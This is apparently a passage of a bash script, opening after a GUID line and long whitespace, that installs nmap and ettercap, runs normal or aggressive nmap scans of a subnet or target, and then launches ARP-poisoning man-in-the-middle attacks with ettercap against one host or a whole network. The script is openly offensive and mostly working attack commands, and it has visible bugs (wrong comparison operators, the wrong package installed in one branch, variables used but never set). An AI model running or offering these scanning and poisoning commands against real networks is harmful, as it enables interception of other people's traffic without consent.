{ D 4 7 A 1 7 6 0 - 2 B 7 C - 4 0 0 5 - B 5 5 F - 2 F 0 6 9 2 5 4 5 0 E E }                                                                                                                                                                                                                                                                                                                                                                                                                                                     
	chk_ettercap=$(which ettercap)
	if [[ $chk_nmap == "/usr/bin/nmap" && $chk_ettercap == "/usr/bin/ettercap" ]]
	then
		echo "Both nmap and ettercap are installed"
	elif [[ $chk_nmap == "/usr/bin/nmap" && $chk_ettercap -ne "/usr/bin/ettercap" ]]
	then 
		echo "nmap is present"
		echo "installing ettercap......./"
		apt install ettercap -y
	elif [[ $chk_nmap -ne "/usr/bin/nmap" && $chk_ettercap == "/usr/bin/ettercap" ]]
	then 
		echo "ettercap is present"
		echo "installing nmap......./"
		apt install ettercap
	else 
		echo "installing both nmap and ettercap....../"
		apt install nmap ettercap -y
        fi
fi

echo "Alright! Everything is setted up"
echo -n "Do you want to scan?? (Y/N)"
read b
if [[ $b == "N" ]]
then
	echo "Nice"
	echo "Let's get attacking!"
elif [[ $b == "Y" ]]
then
	echo "Let's do some research (stealthly!)"
	echo -n "you want to scan a network(1) or a target(2)?  " 
	read c 
	if [[ $c == "1" ]]
	then 
	        echo "which type of scan
		1) Normal 2) Agrresive 3) host scanning"
		read d 
		if [[ $d == "1" ]]
		then
			nmap $nw/24
		elif [[ $d == "2" ]]
		then
			nmap -A $nw/24
		elif [[ $d == "3" ]]
		then
			echo "internal IP : $ip"
			echo "Active Hosts"
			echo "------------"
                        nmap $nw/24 | grep -v "Starting\|done" | awk '{print $5}'
		fi

	elif [[ $c == "2" ]]
	then
	        echo "target:"
		read target1
	        echo "which type of scan
		      1) Normal 2) Agrresive"
		read d 
		if [[ $d == "1" ]]
		then
			nmap $target1
		elif [[ $d == "2" ]]
		then
			nmap -A $target1
		fi
	fi
	echo "let's get attacking!"
fi      
figlet "MITM"
echo "how do you want to attack?"
echo "1) one-to-one poisoning  2) whole network poisoning"
read f
if [[ $f == "1" ]]
then
	echo "target:"
	read target
	echo "target : $target"
	echo "target poisoning in progress..."
	ettercap -TqM ARP:remote //$target/ //$gateway/
elif [[ $f == "2" ]]
then
        echo "whole network poisoning in progress..."	
	ettercap -TqM ARP:remote /// //$gateway/
fi
